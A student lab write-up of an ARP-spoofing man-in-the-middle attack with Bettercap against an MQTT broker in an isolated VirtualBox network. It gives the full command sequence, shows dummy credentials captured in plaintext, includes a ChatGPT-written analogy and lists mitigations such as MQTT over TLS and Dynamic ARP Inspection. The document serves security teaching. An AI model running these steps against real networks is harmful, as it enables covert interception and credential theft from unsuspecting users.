# Day 11 — Man-in-the-Middle Attacks with Bettercap

## Setup
- Attacker: Kali Linux (192.168.56.20)
- Victim IoT Device/MQTT Broker: Ubuntu VM (192.168.56.10)
- Tools: Bettercap, tcpdump, mosquitto-clients

## Network Configuration
Both VMs connected via VirtualBox Host-Only Adapter (vboxnet0):
- Kali: 192.168.56.20 (eth1)
- Ubuntu: 192.168.56.10 (enp0s8)

## Step 1 — IP Forwarding Enabled
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```
Ensures intercepted traffic is forwarded to its destination so the
victim doesn't notice connectivity issues.

## Step 2 — Started Bettercap
```bash
sudo bettercap
```
Entered interactive Bettercap console on Kali.

## Step 3 & 4 — Network Discovery
```
net.probe on
net.show
```
Ubuntu VM (192.168.56.10) identified in the device list.

## Step 5 & 6 — ARP Spoofing Attack
```
set arp.spoof.targets 192.168.56.10
arp.spoof on
```
Bettercap sent fake ARP replies to Ubuntu claiming Kali's MAC address
is the gateway. All Ubuntu traffic now routes through Kali.

## Step 7 — Started Traffic Sniffing
```
net.sniff on
```
Bettercap began capturing all intercepted traffic in real time.

## Step 8 & 9 — Credential Interception
While ARP spoof was active, published an MQTT message with credentials
from Kali targeting the Ubuntu broker:
```bash
mosquitto_pub -h 192.168.56.10 -t 'auth/login' -u 'admin' -P 'secret123' -m 'login'
```
Captured using tcpdump on eth1 while Bettercap spoof was active:
```bash
sudo tcpdump -i eth1 port 1883 -A
```

### Intercepted Packet Output
```
....MQTT....admin.  secret123
```
Username `admin` and password `secret123` were fully visible in plaintext
in the MQTT CONNECT packet on port 1883. Zero decryption required.

## What Happened During the ARP Spoof
Before the attack, Ubuntu's ARP table mapped the gateway to its real MAC.
After arp.spoof on, Bettercap poisoned Ubuntu's ARP cache, replacing the
gateway's MAC with Kali's MAC. All traffic from Ubuntu destined for the
network passed through Kali first, allowing full interception and reading
of all unencrypted data.

## What Data Was Intercepted
- MQTT protocol identifier visible in packet header
- Username: admin
- Password: secret123
- Topic: auth/login
- All transmitted in plaintext on port 1883

## AI Task — ChatGPT ARP Spoofing Analogy
**Prompt used:** "Explain how ARP spoofing works as an analogy — compare
it to something from everyday life that a student would understand."

**ChatGPT response summary:**
ARP spoofing is like a mail interception scam. Imagine your neighbourhood
has a shared mailbox system where everyone announces their address out loud
so the postman knows where to deliver letters. Now imagine a fraudster
stands up and shouts "I live at number 10!" even though they don't — they
live at number 6. The postman believes them (because the system has no ID
checks) and starts delivering number 10's mail to number 6 instead. The
fraudster reads all the letters, maybe copies them, then quietly forwards
them to the real number 10 so nobody notices. ARP spoofing works exactly
the same way — the attacker broadcasts fake MAC-to-IP mappings with no
authentication required, intercepting all traffic silently.

## Key Findings
- ARP has no authentication — any device can claim any IP/MAC mapping
- MQTT port 1883 transmits all data including credentials in plaintext
- MitM + unencrypted MQTT = complete credential theft with basic tools
- Attack is completely invisible to the victim device

## Mitigations
- Use MQTT over TLS (port 8883) — encrypts all traffic including credentials
- Implement Dynamic ARP Inspection (DAI) on managed switches
- Use VPN between IoT devices and broker
- Deploy certificate-based client authentication for MQTT connections<img width="962" height="817" alt="Screenshot 2026-04-01 153611" src="https://github.com/user-attachments/assets/4a8d3ab8-e8aa-4d15-a67b-2e975024a69b" />
<img width="955" height="766" alt="Screenshot 2026-04-01 153522" src="https://github.com/user-attachments/assets/e3908e50-c2c6-41cd-9fa7-84d8386dbe7b" />
<img width="952" height="825" alt="Screenshot 2026-04-01 153503" src="https://github.com/user-attachments/assets/eefb190b-ee09-48ac-a46a-2ba240f05589" />
